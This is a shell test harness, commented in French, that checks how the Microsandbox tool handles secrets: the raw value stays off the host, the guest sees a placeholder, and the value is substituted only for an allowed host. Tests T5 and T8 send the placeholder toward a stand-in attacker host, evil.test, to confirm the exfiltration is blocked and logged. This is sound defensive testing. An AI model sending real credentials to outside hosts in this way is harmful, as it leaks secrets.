#!/bin/sh
# P02: rejoue la matrice de caractérisation du transport des identifiants
# Microsandbox (substitution, violations, rotation, persistance).
# Voir docs/decisions/2026-09-24-microsandbox-credential-transport.md.
#
# Cas réseau: opt-in via MSB_CREDENTIAL_INTEGRATION_NETWORK=1.
# Nécessite le laboratoire local (serveur TLS, DNS, CA) décrit dans README.md.
set -eu

FAILURES=0
PASS=0

ok() { PASS=$((PASS+1)); printf '  ok  %s\n' "$1"; }
fail() { FAILURES=$((FAILURES+1)); printf 'FAIL  %s\n' "$1"; }
check() { # check <nom> <attendu> <obtenu>
  if [ "$2" = "$3" ]; then ok "$1"; else
    fail "$1 (attendu: $2, obtenu: $3)"
  fi
}

MSB="${MSB_BIN:-$HOME/.microsandbox/bin/msb}"
LAB="${MSB_CREDENTIAL_LAB:-/tmp/p02-lab}"
SB="p02-cred-harness"
HERE="$(cd "$(dirname "$0")" && pwd)"

# --- Préambule: environnement et versions ------------------------------------
if [ ! -x "$MSB" ]; then
  echo "msb introuvable: $MSB (MSB_BIN pour surcharger)" >&2
  exit 2
fi

WANT_CLI="$(node -e "console.log(require('$HERE/pin.json').msb_cli_version)")"
GOT_CLI="$("$MSB" --version 2>/dev/null | awk '{print $2}')"
check "CLI msb épinglée" "$WANT_CLI" "$GOT_CLI"

cleanup() {
  "$MSB" stop "$SB" >/dev/null 2>&1 || true
  "$MSB" remove "$SB" >/dev/null 2>&1 || true
}
trap cleanup EXIT

# --- Préambule réseau: laboratoire requis ------------------------------------
# T1/T2 (persistance) exigent une sandbox : elles sont des cas réseau.
if [ "${MSB_CREDENTIAL_INTEGRATION_NETWORK:-0}" != "1" ]; then
  echo "cas réseau ignorés (MSB_CREDENTIAL_INTEGRATION_NETWORK=1 pour les activer)"
  echo
  echo "réussites: $PASS, échecs: $FAILURES"
  [ "$FAILURES" -eq 0 ]
  exit 0
fi

for f in "$LAB/ca.crt" "$LAB/ca.key" "$LAB/srv.crt" "$LAB/srv.key"; do
  if [ ! -f "$f" ]; then
    echo "laboratoire incomplet: $f manquant (voir README.md)" >&2
    exit 2
  fi
done

HOST_IP="$(ipconfig getifaddr en0 2>/dev/null || true)"
if [ -z "$HOST_IP" ]; then
  echo "impossible de déterminer l'IP LAN hôte (en0)" >&2
  exit 2
fi

# Prévol: les services du laboratoire répondent, sinon c'est un échec de
# préparation (code 2), pas une régression de transport (T1-T11).
if ! nc -z -w 5 127.0.0.1 8443 >/dev/null 2>&1; then
  echo "laboratoire: serveur TLS echo absent sur 127.0.0.1:8443" >&2
  exit 2
fi
if ! curl -s -m 10 --cacert "$LAB/ca.crt" -o /dev/null "https://127.0.0.1:8443/preflight" 2>/dev/null; then
  echo "laboratoire: serveur TLS ne répond pas (certificat CA refusé)" >&2
  exit 2
fi
if ! nslookup -timeout=5 -port=5354 p02lab.test 127.0.0.1 >/dev/null 2>&1 && \
   ! dig +time=5 +short p02lab.test @127.0.0.1 -p 5354 >/dev/null 2>&1; then
  echo "laboratoire: serveur DNS absent (p02lab.test non résolu sur 5354)" >&2
  exit 2
fi

CANARY="p02-harness-canary-$RANDOM"
export P02_CANARY="$CANARY"

# Journal scopé à l'exécution courante : le serveur écho écrit dans
# requests.log ; on bascule sur un journal frais par exécution en redémarrant
# le serveur (évite à la fois l'historique et la corruption d'une troncature
# sous un serveur actif).
if [ -n "${MSB_CREDENTIAL_LAB_RESTART:-1}" ] && [ -f "$LAB/server.py" ]; then
  pkill -f "server.py 8443" >/dev/null 2>&1 || true
  sleep 1
  (cd "$LAB" && python3 server.py 8443 > requests.log 2>&1 &)
  sleep 12
fi
if [ ! -f "$LAB/requests.log" ]; then
  echo "laboratoire: requests.log absent après préparation" >&2
  exit 2
fi

# --- Création avec interception TLS sur 443 et 8443 ---------------------------
"$MSB" create \
  --net host --net public --net private \
  --dns-nameserver "$HOST_IP:5354" --dns-nameserver 1.1.1.1 \
  --no-dns-rebind-protection \
  --tls-intercept --tls-intercept-port 443 --tls-intercept-port 8443 \
  --tls-intercept-ca-cert "$LAB/ca.crt" --tls-intercept-ca-key "$LAB/ca.key" \
  --tls-upstream-ca-cert "$LAB/ca.crt" \
  --secret "P02_CANARY@p02lab.test" \
  --name "$SB" alpine >/dev/null

# T1: la valeur brute n'est jamais persistée côté hôte (chemin CLI).
DB_VALUE="$(sqlite3 "$HOME/.microsandbox/db/msb.db" \
  "SELECT config FROM sandbox WHERE name='$SB';" | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{const j=JSON.parse(d);const s=(j.network.secrets.secrets||[]).find(x=>x.env_var==='P02_CANARY');console.log(s?s.value:'missing')})")"
check "T1 DB hôte sans valeur brute" "" "$DB_VALUE"

INSPECT_LEAK="$("$MSB" inspect "$SB" --format json 2>/dev/null | grep -c "$CANARY" || true)"
check "T2 msb inspect sans valeur brute" "0" "$INSPECT_LEAK"

# T3: l'invité ne voit que le placeholder.
GUEST_ENV="$("$MSB" exec "$SB" -- sh -c 'printf %s "$P02_CANARY"' 2>/dev/null)"
check "T3 invité voit le placeholder" '$MSB_P02_CANARY' "$GUEST_ENV"

# T4: substitution d'en-tête vers l'hôte autorisé.
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t4' \
  >/dev/null 2>&1 || true
T4_AUTH="$(grep '"path": "/t4"' "$LAB/requests.log" | tail -1 | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
case "$T4_AUTH" in
  "Bearer $CANARY") ok "T4 substitution en-tête (hôte autorisé)" ;;
  *) fail "T4 substitution en-tête: obtenu '$T4_AUTH'" ;;
esac

# T5: placeholder vers un hôte non autorisé -> blocage (block-and-log).
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://evil.test:8443/t5' \
  >/dev/null 2>&1 || true
T5_REACHED="$(grep -c '"path": "/t5"' "$LAB/requests.log" || true)"
if [ "$T5_REACHED" = "0" ]; then
  ok "T5 hôte non autorisé: requête jamais livrée"
else
  fail "T5 hôte non autorisé: requête livrée"
fi
T5_LOG="$(grep -c "secret violation.*evil.test" "$HOME/.microsandbox/sandboxes/$SB/logs/runtime.log" || true)"
if [ "$T5_LOG" -ge 1 ]; then
  ok "T5 violation journalisée (block-and-log)"
else
  fail "T5 violation absente du journal runtime"
fi

# T6: canal query non substitué -> violation même vers l'hôte autorisé.
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="X-T: $P02_CANARY" "https://p02lab.test:8443/t6?tok=$P02_CANARY"' \
  >/dev/null 2>&1 || true
T6_REACHED="$(grep -c '"path": "/t6' "$LAB/requests.log" || true)"
if [ "$T6_REACHED" = "0" ]; then
  ok "T6 canal query: violation (non substitué par défaut)"
else
  fail "T6 canal query: requête livrée avec placeholder"
fi

# T7: Basic auth — le placeholder base64-encodé EST reconnu et substitué.
T7_B64="$(printf 'user:$MSB_P02_CANARY' | base64)"
"$MSB" exec "$SB" -- sh -c \
  "wget -q -T 20 -O- --header='Authorization: Basic $T7_B64' https://p02lab.test:8443/t7" \
  >/dev/null 2>&1 || true
T7_AUTH="$(grep '"path": "/t7"' "$LAB/requests.log" | tail -1 | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
T7_DEC="$(printf '%s' "$T7_AUTH" | sed 's/^Basic //' | base64 -d 2>/dev/null || echo bad)"
check "T7 Basic auth substitué (base64 reconnu)" "user:$CANARY" "$T7_DEC"

# T8: redirection autorisée -> non autorisée: le 2e saut est bloqué.
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/redirect-to-evil' \
  >/dev/null 2>&1 || true
T8_HOP1="$(grep '"path": "/redirect-to-evil"' "$LAB/requests.log" | tail -1 | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
T8_HOP2="$(grep -c '"path": "/redirect-target"' "$LAB/requests.log" || true)"
case "$T8_HOP1" in
  "Bearer $CANARY") ok "T8a 1er saut substitué" ;;
  *) fail "T8a 1er saut: obtenu '$T8_HOP1'" ;;
esac
if [ "$T8_HOP2" = "0" ]; then
  ok "T8b 2e saut (hôte non autorisé) bloqué"
else
  fail "T8b 2e saut livré"
fi

# T9: rotation d'un secret existant sur invité en cours d'exécution — live.
export P02_CANARY="p02-harness-rotated-$RANDOM"
"$MSB" modify "$SB" --secret "P02_CANARY@p02lab.test" >/dev/null
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t9' \
  >/dev/null 2>&1 || true
T9_AUTH="$(grep '"path": "/t9"' "$LAB/requests.log" | tail -1 | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
case "$T9_AUTH" in
  "Bearer $P02_CANARY") ok "T9 rotation live (sans redémarrage)" ;;
  *) fail "T9 rotation: obtenu '$T9_AUTH'" ;;
esac

# T10: suppression — le placeholder passe littéralement vers l'hôte autorisé.
"$MSB" modify "$SB" --secret-rm P02_CANARY >/dev/null
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t10' \
  >/dev/null 2>&1 || true
T10_AUTH="$(grep '"path": "/t10"' "$LAB/requests.log" | tail -1 | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
check "T10 après suppression: placeholder littéral (pas de valeur)" 'Bearer $MSB_P02_CANARY' "$T10_AUTH"

# T11: ré-ajout — nécessite --next-start + redémarrage (asymétrie avec T9).
export P02_CANARY="p02-harness-readd-$RANDOM"
if "$MSB" modify "$SB" --secret "P02_CANARY@p02lab.test" >/dev/null 2>&1; then
  fail "T11a ré-ajout immédiat accepté (attendu: refus sans --next-start)"
else
  ok "T11a ré-ajout refusé sans --next-start"
fi
"$MSB" modify "$SB" --secret "P02_CANARY@p02lab.test" --next-start >/dev/null
"$MSB" restart "$SB" >/dev/null
sleep 5
"$MSB" exec "$SB" -- sh -c \
  'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t11' \
  >/dev/null 2>&1 || true
T11_AUTH="$(grep '"path": "/t11"' "$LAB/requests.log" | tail -1 | \
  node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
case "$T11_AUTH" in
  "Bearer $P02_CANARY") ok "T11b ré-ajout actif après redémarrage" ;;
  *) fail "T11b ré-ajout: obtenu '$T11_AUTH'" ;;
esac

echo
echo "réussites: $PASS, échecs: $FAILURES"
[ "$FAILURES" -eq 0 ]
